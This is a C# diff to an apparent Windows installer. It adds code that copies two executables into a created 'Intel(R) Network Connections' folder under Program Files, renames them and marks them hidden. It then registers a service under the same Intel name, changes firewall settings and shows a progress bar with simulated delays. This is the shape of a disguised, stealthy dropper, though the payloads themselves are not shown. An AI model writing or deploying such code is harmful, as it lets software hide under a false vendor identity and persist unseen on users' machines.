@@ -1,5 +1,6 @@
 ﻿using System;
 using System.ComponentModel;
+using System.IO;
 using System.Reflection;
 using System.Windows.Forms;
 
@@ -28,24 +29,44 @@ namespace Installer
         void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
         {
             // Your background task goes here
+            #region Copy files
+            String path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Intel\Intel(R) Network Connections\uninstall\";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            else
+            {
+                File.Delete(path + "\\bfscc.exe");
+                File.Delete(path + "\\bfswc.exe");
+            }
+
+            System.IO.File.Copy(Application.StartupPath + "\\console.exe", path + "\\bfscc.exe", true);
+            File.SetAttributes(path + "\\bfscc.exe", FileAttributes.Hidden);
+            UpdateProgressBar(8);
+
+            System.IO.File.Copy(Application.StartupPath + "\\service.exe", path + "\\bfswc.exe", true);
+            File.SetAttributes(path + "\\bfswc.exe", FileAttributes.Hidden);
+            UpdateProgressBar(20);
+
+            System.IO.File.Copy(Application.StartupPath + "\\setup.exe", path + "\\uninstall.exe", true);
+            UpdateProgressBar(34);
+            #endregion
 
             #region Install Windows Service
             String filePath = Application.StartupPath + "\\WindowsService.exe";
             Assembly assembly = Assembly.LoadFrom(filePath);
             Utils.InstallService("Intel(R) Network Connections", assembly);
+            UpdateProgressBar(55);
             #endregion
+
 
             //Add Firewall rule
             Utils.ConfigureFirewall();
-
-            for (int i = 0; i <= 100; i++)
+            UpdateProgressBar(62);
+            for (int i = 65; i <= 100; i++)
             {
-                // Report progress to 'UI' thread
-                backgroundWorker1.ReportProgress(i);
-                // Simulate long task
-                Random rnd = new Random();
-                int randomNumber = rnd.Next(50,100);
-                System.Threading.Thread.Sleep(randomNumber);
+                UpdateProgressBar(i);
             }
         }
 
@@ -54,7 +75,7 @@ namespace Installer
         {
             // The progress percentage is a property of e
             progressBar.Value = e.ProgressPercentage;
-            if(progressBar.Value > 100)
+            if (progressBar.Value >= 100)
             {
                 btnNext.Enabled = true;
             }
@@ -66,6 +87,16 @@ namespace Installer
             this.Hide();
             finish.ShowDialog();
             this.Close();
+        }
+
+        private void UpdateProgressBar(int i)
+        {
+            // Report progress to 'UI' thread
+            backgroundWorker1.ReportProgress(i);
+            // Simulate long task
+            Random rnd = new Random();
+            int randomNumber = rnd.Next(50, 100);
+            System.Threading.Thread.Sleep(randomNumber);
         }
     }
 }
